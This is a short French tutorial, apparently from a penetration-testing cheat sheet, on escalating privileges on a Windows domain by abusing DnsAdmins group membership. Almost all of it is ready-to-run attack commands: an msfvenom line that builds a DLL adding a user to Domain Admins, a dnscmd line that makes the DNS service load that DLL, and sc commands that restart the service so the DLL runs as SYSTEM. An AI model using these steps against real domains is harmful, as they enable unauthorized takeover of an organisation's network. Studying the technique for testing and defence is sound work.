Le groupe DnsAdmins permet une administration partielle des services DNS sur un domaine Windows. Ce groupe peut également être exploité pour une élévation de privilèges, en raison de la capacité à charger des bibliothèques DLL arbitraires dans le processus du service DNS.

### Implications en matière de sécurité

L'abus de ce privilège peut permettre une élévation de privilèges à `NT AUTHORITY\SYSTEM`, le niveau de privilège le plus élevé sur un système Windows. C'est parce que le service DNS s'exécute sous ce compte utilisateur.

### Génération du .DLL

La première étape est de générer un fichier DLL qui, lorsqu'il est chargé, exécutera un code arbitraire. Vous pouvez utiliser msfvenom pour cela :

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### Transfert du .DLL et Injection

Après avoir transféré le fichier `.dll` sur la machine cible, utilisez `dnscmd.exe` pour configurer le serveur DNS afin qu'il charge la DLL :

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
### Redémarrage du service DNS

Après avoir configuré la DLL, il vous faudra redémarrer le service DNS pour que la DLL soit chargée et exécutée.

Pour arrêter le service DNS :

```cmd
sc stop dns
```

Pour démarrer le service DNS :

```cmd
sc start dns
```

